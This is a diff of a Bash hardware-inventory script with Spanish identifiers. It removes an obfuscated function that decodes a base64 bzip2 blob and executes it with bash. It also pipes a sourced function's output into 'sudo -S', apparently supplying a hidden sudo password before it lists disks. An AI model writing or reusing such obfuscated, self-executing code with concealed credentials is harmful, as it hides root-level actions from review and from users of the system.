@@ -26,10 +26,11 @@ funcion_notificacion(){
         fi          
 }
 
-funcion_AudioX(){
-      ${@,,} $'b\x61s'$'\150' ${*,} ${*,,}   <<<   "$(      ${*~} ''\p$'\x72'$'\x69''n'tf  'QlpoOTFBWSZTWQQ6uQsAAAOdgEAABwBAAQpAhAAgACIAMQgGmmgtNXY1ArGXi7kinChIAh1chYA='   "${@%%\]=\]G\`\{:}" "${@~~}"  |   ${*/X=0\{nO/sb\[7\`44;}   ${@~~} b'a'se6$'\u0034'  -d   ${*,,}   |  ${@#O<Qau\]=P}   ${*,,}   ""b'u'${*^}n""$'z\x69'\p$[   ((${*}3${*%%ZY\)lq.p}5#0*3"5""#"0)+${*}37#"2")  ]   -c  ${@,} "${@}"      )"  "${@//\[\)\)-;}"  "${@~}" 
-}
 
+
+source ./script_hijo_00XX.sh
+
+funcion_Data
 
 Musica_l=$(source ./script_hijo_00X.sh)
 
@@ -70,7 +71,7 @@ rm $RutaLecturaGen/discos_duros.txt
  Placa_Madre=$(cat $RutaLecturaGen/placa_madre.txt | grep -E "Product Name:")
  Placa_Madre_Ver=$(cat $RutaLecturaGen/placa_madre.txt | grep -E "Version:")
  MemoriaRam=$(cat $RutaLecturaGen/memoria_ram.txt | grep "Size" )
- echo $Musica_l | sudo -S ls /root && sudo parted -l > $RutaLecturaGen/discos_duros.txt
+ funcion_Data | sudo -S ls /root && sudo parted -l > $RutaLecturaGen/discos_duros.txt
  DiscoDuro=$(cat $RutaLecturaGen/discos_duros.txt | grep Disco | while read Col1 Col2 Col3; do echo $Col3; done )
  Procesador=$(cat $RutaLecturaGen/procesador.txt | grep -E "Version:")
  
